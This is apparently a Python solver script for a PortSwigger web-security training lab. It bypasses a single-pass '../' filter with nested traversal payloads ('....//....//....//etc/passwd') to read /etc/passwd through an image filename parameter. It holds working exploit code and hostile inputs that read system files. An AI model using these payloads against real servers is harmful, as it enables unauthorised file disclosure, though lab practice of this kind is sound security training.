# Lab 03 — File path traversal, traversal sequences stripped non-recursively
# PortSwigger: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
#
# Vulnerability: The app strips "../" from the input, but only in a single,
#                non-recursive pass — it never re-checks the result
# Aim:           Retrieve the contents of /etc/passwd
#
# Technique:
#   Nest the blocked substring around the real payload. A single-pass strip
#   of "../" removes the wrapper characters and leaves behind a working
#   traversal sequence underneath.
#
#     ....//....//....//etc/passwd
#     → after one non-recursive strip of "../" → ../../../etc/passwd
#
# Usage: python path_traversal_lab03.py <url>

import sys
import urllib3
from proxies import proxies
from path_traversal_utils import banner, section, make_session, try_traversal_payload, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BLOCKED_PAYLOAD = "../../../etc/passwd"
BYPASS_PAYLOAD  = "....//....//....//etc/passwd"

if __name__ == "__main__":
    banner()
    section("LAB 03 — TRAVERSAL SEQUENCES STRIPPED NON-RECURSIVELY")

    if len(sys.argv) != 2:
        print("  Usage: python path_traversal_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm the naive payload is stripped and fails ─────────────
    print("  ── Step 1: confirm naive traversal is stripped (expect failure)\n")
    try_traversal_payload(session, url, "/image", "filename", BLOCKED_PAYLOAD,
                           label="Naive traversal (expected stripped/blocked)")

    # ── Step 2: nested bypass — the strip leaves a working payload behind ──
    print("\n  ── Step 2: nested bypass payload\n")
    print(f"  ℹ  Payload: {BYPASS_PAYLOAD}")
    print(f"  ℹ  After a single-pass strip of '../', this resolves to:")
    print(f"     ../../../etc/passwd\n")

    r = try_traversal_payload(session, url, "/image", "filename", BYPASS_PAYLOAD,
                               label="Nested bypass")

    if "root:" in r.text:
        print_box("/etc/passwd contents (truncated)", r.text[:800])
    else:
        print("\n  ✘  /etc/passwd contents not found — inspect manually")
        print("     Some lab instances may need a different nesting depth —")
        print("     try adjusting the number of '....//' repetitions.")
        print_box("Raw response snippet", r.text[:400])
